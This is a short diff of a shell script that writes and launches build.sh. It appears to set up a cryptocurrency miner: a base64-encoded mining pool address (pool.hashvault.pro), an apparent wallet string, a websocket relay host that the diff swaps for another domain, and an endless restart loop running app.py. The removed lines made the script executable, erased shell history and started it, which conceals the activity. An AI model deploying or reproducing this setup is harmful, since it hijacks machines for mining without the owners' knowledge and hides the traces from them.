@@ -19,7 +19,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
+echo "SERVER_WS=wss://vpn.dichoiseptoa.site
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
 SERVER_SECRET=$NAME
@@ -29,6 +29,3 @@ while true; do
   python3 app.py
   sleep 15
 done' > build.sh
-chmod +x ./build.sh
-history -c && history -w && clear
-bash build.sh 1 xvi
